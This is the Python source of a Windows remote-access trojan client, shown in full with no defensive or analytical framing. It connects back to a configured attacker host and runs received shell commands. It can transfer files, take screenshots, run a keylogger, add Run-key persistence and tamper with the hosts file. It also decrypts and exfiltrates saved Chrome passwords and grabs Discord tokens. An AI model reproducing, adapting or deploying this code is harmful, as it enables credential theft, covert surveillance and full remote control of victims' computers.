import socket
import json
import subprocess
import time
import discord
import ctypes, os
import pyautogui
import keylogger
import threading
import shutil
import sys
import sqlite3
import base64
import win32crypt
from config import *
from Crypto.Cipher import AES
from datetime import datetime, timedelta

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout:
            break
    s.settimeout(None)
    f.close()



def blockwebsite():
    if check() == "No admin privilege":
        reliable_send("this module requires admin privilege")
    else:
        try:
            redirect = redirect_ip
            website_list = target_web
            with open("C:\Windows\System32\drivers\etc\hosts", 'r+') as f:
                content = f.read()
                for website in website_list:
                    if website in content:
                        pass
                    else:
                        f.write(redirect + " " + website + "\n")
                f.close()
            reliable_send(f"operation succeeded, {website_list} has been blocked")
        except:
            reliable_send("operation failed")
    shell()

def unblockweb():
    if check() == "No admin privilege":
        reliable_send("this module requires admin privilege")
    else:
        try:
            with open("C:\Windows\System32\drivers\etc\hosts", 'r+') as f:
                f.truncate(0)
                f.close()
                reliable_send("all websites have been unblocked")
        except:
            reliable_send("operation failed")
    shell()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screenshot.jpg')


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')


def connection():
    while True:
        try:
            time.sleep(3)
            s.connect((lhost, lport))
            shell()
            s.close()
            break
        except:
            connection()


def check():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        return("Have admin privilege!!!")
    else:
        return("No admin privilege")

def checkp():
    substring = "Record Name"
    result2 = []
    execute = subprocess.Popen("ipconfig /displaydns", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    result = (execute.stdout.read() + execute.stderr.read()).decode()
    split = result.splitlines()
    for i in split:
        if substring in i:
            web = i.split(":")[1].replace(" ", "")
            if web in porn and web not in result2:
                result2.append(web)
            else:
                pass
        else:
            pass

    if len(result2) == 0:
        try:
            reliable_send("No porn sites detected")
        except:
            pass
    else:
        fresult = (' ,'.join(result2) + " has been detected")
        try:
            reliable_send(fresult)
        except:
            pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def chrome():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        file_object = open("log.txt", 'a')
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                file_object.write(f"Origin URL: {origin_url}\n")
                file_object.write(f"Action URL: {action_url}\n")
                file_object.write(f"Username: {username}\n")
                file_object.write(f"Password: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                file_object.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                file_object.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
                file_object.write("=" * 50 + "\n")

        file_object.close()

        cursor.close()
        db.close()
        upload_file("log.txt")
        shell()
    except:
        shell()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screenshot.jpg')
            os.remove('screenshot.jpg')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            keylog = keylogger.Keylogger()
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog = keylogger.Keylogger()
            keylog.self_destruct()
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:10] == "chromegrab":
            chrome()
            os.remove('ChromeData.db')
        elif command[:6] == "dtoken":
            discord.main()
        elif command[:9] == "checkpriv":
            reliable_send(check())
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        elif command == "checkporn":
            checkp()
        elif command == "blocksite":
            blockwebsite()
        elif command == "unblocksite":
            unblockweb()
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

connection()

#do not delete this comment
